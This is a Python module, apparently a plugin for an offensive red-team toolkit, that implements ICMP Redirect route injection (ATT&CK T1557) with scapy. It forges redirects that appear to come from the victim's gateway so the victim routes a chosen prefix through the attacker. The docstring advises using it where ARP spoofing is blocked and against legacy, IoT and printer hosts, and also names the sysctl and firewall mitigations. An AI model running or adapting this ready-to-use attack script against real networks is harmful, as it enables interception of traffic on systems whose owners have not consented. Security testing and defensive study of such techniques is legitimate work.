"""
ICMP Redirect Route Injection — T1557

Sends forged ICMP Redirect (type 5, code 1) telling the victim to
route a target prefix via the attacker IP. Lightweight L3 MITM
without ARP poisoning — works where DAI blocks ARP spoof.

Requires: victim uses the real gateway (redirect accepted),
attacker is on a plausible next-hop path. Most hardened hosts
ignore redirects — best against legacy/IoT/printers.

Mitigation: ignore ICMP redirects (sysctl net.ipv4.conf.*.accept_redirects=0),
host firewall drop type 5.
"""
import time

from scapy.all import Ether, IP, ICMP, UDP, Raw, sendp

NAME = "icmp-redir"
DESCRIPTION = "ICMP Redirect injection — steer host route via attacker"
ATTCK_ID = "T1557"


def register(subparsers, add_engagement_args):
    p = subparsers.add_parser(NAME, help=f"{DESCRIPTION} ({ATTCK_ID})",
                              description=__doc__)
    p.add_argument("-i", "--interface", required=True)
    p.add_argument("-t", "--target", required=True, help="Victim IP")
    p.add_argument("-g", "--gateway", required=True, help="Real gateway IP (spoofed src)")
    p.add_argument("--victim-net", required=True, help="Prefix to redirect, e.g. 10.0.0.0/24")
    p.add_argument("--attacker-ip", required=True, help="New next-hop (attacker IP)")
    p.add_argument("-c", "--count", type=int, default=20)
    p.add_argument("--interval", type=float, default=1.0)
    p.add_argument("--verbose", "-v", action="store_true")
    add_engagement_args(p)
    p.set_defaults(func=run)


def run(args, logger):
    from core.common import require_root, resolve_mac
    require_root()
    logger.info("START | technique=%s | victim=%s | net=%s via %s",
                ATTCK_ID, args.target, args.victim_net, args.attacker_ip)
    vmac = resolve_mac(args.target, args.interface)
    if not vmac:
        logger.error("Cannot resolve victim MAC — check L2 reachability")
        return 1
    # Embedded original datagram: victim -> redirected net
    inner = IP(src=args.target, dst=args.victim_net.split("/")[0]) / UDP(sport=1234, dport=80) / Raw(b"X" * 8)
    pkt = (Ether(dst=vmac) / IP(src=args.gateway, dst=args.target) /
           ICMP(type=5, code=1, gw=args.attacker_ip) / inner)
    try:
        for i in range(args.count):
            sendp(pkt, iface=args.interface, verbose=args.verbose)
            if (i + 1) % 5 == 0:
                logger.info("[REDIR] %d/%d", i + 1, args.count)
            time.sleep(args.interval)
        logger.info("END | success=True — check victim route get %s", args.victim_net.split("/")[0])
        return 0
    except Exception as e:
        logger.error("[REDIR] Error: %s", e)
        return 1
